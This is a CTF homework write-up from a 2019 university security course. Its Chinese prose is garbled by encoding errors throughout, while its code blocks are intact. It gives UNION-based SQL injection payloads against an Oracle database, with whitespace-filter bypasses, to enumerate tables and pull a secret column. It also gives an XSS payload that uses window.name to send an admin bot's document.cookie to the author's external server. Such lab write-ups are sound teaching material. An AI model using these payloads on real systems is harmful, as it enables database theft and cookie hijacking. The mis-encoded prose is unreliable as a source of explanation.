---
title: "ç¨‹å¼å®‰å…¨::HW4 Write-up"
description: ""
publishDate: "2019-12-18"
category: "CTF"
layout: "../../layouts/ArticleLayout.astro"
---


2019 å¹´äº¤å¤§ç¨‹å¼å®‰å…¨ HW4 write-up
å“ˆå“ˆæ˜¯æˆ‘æ‹‰ğŸ˜ğŸ˜ğŸ˜åŠ©æ•™æ‹‰ğŸ¤™ğŸ¤™ğŸ¤™

# Cathubv2

æœ¬é¡Œçš„æ¼æ´åœ¨å½±ç‰‡çš„é é¢ï¼ˆé»é€²å»ä»»æ„ä¸€æ”¯å½±ç‰‡çš„åœ°æ–¹ï¼‰ï¼Œurl è£¡çš„ vid æœƒè¢«èƒŒå¾Œçš„ OracleDB æŠ“å»æœå°‹ï¼Œæˆ‘å€‘å¯ä»¥çŒœæƒ³åˆ°å½±ç‰‡é€£çµèˆ‡æ¨™é¡Œæ‡‰è©²æ˜¯å¾DBæ’ˆå‡ºä¾†çš„ï¼Œæ‰€ä»¥æˆ‘å€‘å¯èƒ½å¯ä»¥é€é UNION çš„æ–¹å¼ä¾†ç›´æ¥æŠŠè³‡è¨Šå°å‡ºä¾†ï¼Œé€™è£¡å¯ä»¥å…ˆæ¸¬è©¦æœ‰å¹¾å€‹ column :

```sql
vid=-1 union select 1,null from dual
```

è¦æ³¨æ„çš„æ˜¯ç©ºç™½æœƒè¢«é˜»æ“‹ï¼Œæ‰€ä»¥æˆ‘å€‘è¦æŠŠç©ºç™½ç½®æ›æˆ `/**/` æˆ–æ˜¯ `%0a` ä¾†ç¹éæª¢æŸ¥ï¼ŒåŒæ™‚ä¹Ÿå¯ä»¥ç™¼ç¾ `'` è·Ÿ `chr` ä¹Ÿæœƒè¢«æ“‹ä¸‹ä¾†ï¼Œæœ€å¾Œæˆ‘å€‘å¯ä»¥çŸ¥é“ç¸½å…±æœ‰ä¸‰å€‹æ¬„ä½ï¼š

```sql
vid=-1 union select 1,null,null from dual
```

é€šéæ¸¬è©¦å¯ä»¥çŸ¥é“ï¼Œç¬¬äºŒå€‹æ¬„ä½æ˜¯å½±ç‰‡æ¨™é¡Œï¼Œé€™è£¡æˆ‘å€‘å¯ä»¥å»æ’ˆ oracleDB çš„ metadata ä¾†æ‰¾æœ‰è¶£çš„ table åï¼š

```sql
vid=-1 union select null,table_name,null from user_tables offset 1 rows fetch first 1 rows only

vid=-1 union select null,table_name,null from user_tables offset 2 rows fetch first 1 rows only

vid=-1 union select null,table_name,null from user_tables offset 3 rows fetch first 1 rows only

...
```

æœƒç™¼ç¾æ’ˆå‡ºåç‚º `S3CRET` çš„ tableï¼Œé€™æ™‚æˆ‘å€‘å¯ä»¥å˜—è©¦å»çœ‹ä»–æœ‰ä»€éº¼ columnï¼Œå‰é¢æåˆ° `'` è¢«æ“‹ä½æ‰€ä»¥ç„¡æ³•ç›´æ¥ä½¿ç”¨ `where table_name='S3CRET'`ï¼Œç°¡å–®ä½¿ç”¨ `()` åšå¦å¤–ä¸€æ¬¡ query å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨ where äº†ï¼š

```sql
vid=-1 union select null,column_name,null from user_tab_columns where
    table_name=(select table_name from user_all_tables offset 5 rows fetch first 1 rows only)
offset 1 rows fetch first 1 rows only
```

å¯ä»¥æ‰¾åˆ°æœ‰ä¸€å€‹ column å«åš `V3RY_S3CRET_C0LUMN`ï¼Œæ‰€ä»¥ç¾åœ¨åªè¦æŠŠè©² column çš„å€¼éƒ½æ’ˆå‡ºä¾†å°±å¥½äº†ï¼š

```sql
select V3RY_S3CRET_COLUMN from S3CRET offset 1 rows fetch first 1 rows only

...
```

ç„¶å¾Œå°±å¯ä»¥æ‹¿åˆ° flag äº†ã€‚

# how2xss

ç¹éæ–¹å¼åŒé€™å€‹ [writeup](https://medium.com/@renwa/security-fest-2019-ctf-entropian-web-write-up-f81fb11f675b)ï¼Œé€™è£¡è¼ƒç‰¹åˆ¥çš„å°±æ˜¯ `window.name`ï¼Œåœ¨ä¸€å€‹ window è£¡é¢è¼‰å…¥çš„ document äº‹å¯¦ä¸Šæ˜¯å…±ç”¨ä¸€å€‹ window.nameï¼Œæ¯å€‹è¼‰å…¥çš„ document éƒ½å¯ä»¥å»è®€å¯«ä»–ï¼Œæ‰€ä»¥å¦‚æœé¡Œç›®æ²’å° `window.name` åšéä¿®æ”¹çš„è©±ï¼Œä»–æœƒä½¿ç”¨ä¸Šä¸€å€‹é é¢çš„ `window.name` ï¼Œé€™æ¨£æˆ‘å€‘å¯ä»¥ä¸ç”¨ç”¨ iframe å»å¤šåšä¸€å€‹ window ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥åœ¨æˆ‘å€‘çš„ server ä¸Šæ”¾ payload ï¼Œè®“ admin ç›´æ¥é€ è¨ª payload æ‰€åœ¨çš„ç¶²å€ï¼Œè€Œä¸ä¸€å®šè¦ iframe:

```javascript terrynini.tw
<script>
window.name="document.location='https://terrynini.tw/'+document.cookie";
window.location="https://edu-ctf.kaibro.tw:30678/hackme.php?q=%3CSVG/ONLoAD=eval(n%26%2397;m\\u{65})%3E";
</script>
```

ç„¶å¾Œç›´æ¥å›å ± `terrynini.tw` çµ¦ adminï¼Œé€™æ¨£ `window.location` è·³è½‰ä¹‹å¾Œï¼Œå…¶å¯¦æˆ‘å€‘ `window.name` é‚„æ˜¯æœƒè¢«ä¿å­˜ï¼Œå¦‚æ­¤é€éæœ¬ä¾†é é¢çš„ xss æ¼æ´ä¾†è§¸ç™¼ `svg/onload` è£¡çš„ `eval` å»é€ è¨ªæˆ‘å€‘çš„ serverï¼Œå¦‚æ­¤å¯ä»¥åœ¨è‡ªå·± server ä¸Šçš„ apache access log çœ‹åˆ° admin bot é€ è¨ªäº†ä»€éº¼ uriï¼Œä¹Ÿå°±æ˜¯ `document.cookie`ã€‚

## 12/25 è£œå……

çœ‹äº†å¤§å®¶ç¹³äº¤çš„ writeup å…¶å¯¦ä¸å¤ªç¢ºå®šå¤§å®¶æ˜¯ä¸æ˜¯æœ‰ç†è§£åŸç†....ï¼Œå› ç‚ºé€™é¡Œè¼ƒæ··äº‚ï¼Œæ‰€ä»¥é€™æ¬¡ä½œæ¥­è©•åˆ†æœ‰è§£é‡‹æ¸…æ¥šçš„äººæœƒå¤šä¸€å€‹ `+` è™Ÿï¼Œåˆ†æ•¸ä¹‹å¾Œå†è¨è«–ï¼Œç¸½æ‹¬ä¾†èªªæœƒæœ‰å…©ç¨® payload ï¼Œä¸€ç¨®æ˜¯åƒä¸Šè¿° writeup ä¸€æ¨£ä½¿ç”¨ `<iframe src=/\PSHTA.ML>` è®“ admin è¨ªå•ï¼Œç¬¬äºŒç¨®æ˜¯ç›´æ¥æŠŠ javascript æ‰€åœ¨çš„ç¶²å€çµ¦ admin å»è¨ªå•ã€‚ä¸»è¦å·®åˆ¥åœ¨æ–¼ï¼Œå¦‚æœå›å ±çµ¦ admin çš„ç¶²å€å¿…é ˆä¹Ÿå¾—æ˜¯ `https://edu-ctf.kaibro.tw:30678/hackme.php?q=` çš„è©±ï¼Œé‚£æˆ‘å€‘å°±å¿…é ˆä½¿ç”¨ `iframe` çš„æ–¹å¼ä¸å¯ï¼Œä½†é€™é¡Œå…¶å¯¦æ²’æœ‰é€™å€‹é™åˆ¶ï¼Œæ‰€ä»¥ä¸éœ€è¦å¤šç¹ä¸€å€‹ `iframe` ä¾†å®Œæˆï¼Œå¯ä»¥ç›´æ¥å‚³ç¶²å€å°±å¥½äº†ã€‚

å› ç‚ºä¸çŸ¥é“å¤§å®¶æ˜¯ä¸æ˜¯æœ‰ç™¼ç¾å¯ä»¥å›å ±å¤–éƒ¨ç¶²åŸŸï¼Œwriteup çš„èªæ„å¯èƒ½æœ‰èª¤æœƒï¼Œæ‰€ä»¥é€™è£¡ä¸ç”¨ `A/B` ä¾†è©•åˆ†ï¼Œå°±è®“æœ‰è§£é‡‹æ¸…æ¥šçš„äººå¤šé»åˆ†æ•¸é€™æ¨£å­ã€‚

åœ¨å…¶ä»–éƒ¨åˆ†ï¼Œé€™å…©ç¨® payload å…¶å¯¦æ²’æœ‰å·®åˆ¥ï¼Œ `iframe` è·Ÿç›´æ¥å­˜å–ç¶²å€ä¸€æ¨£ï¼Œéƒ½æœ‰è·¨åŸŸæ‹¿ cookie çš„å•é¡Œï¼Œæ‰€ä»¥æˆ‘å€‘ä¸èƒ½åœ¨ `iframe` è£¡é¢ç›´æ¥æ‹¿ cookieï¼Œå¿…é ˆæŠŠ admin å°å›åŒç¶²åŸŸ (`edu-ctf.kaibro.tw`) ä¸­æœ‰ Reflected XSS æ¼æ´çš„é é¢ï¼Œé€™è£¡åˆ©ç”¨ `window.name` è·¨åŸŸçš„ç‰¹æ€§æ‰€ä»¥å¯ä»¥å¤¾å¸¶æˆ‘å€‘çœŸå¯¦çš„ payload ä¾†ç¹é filterã€‚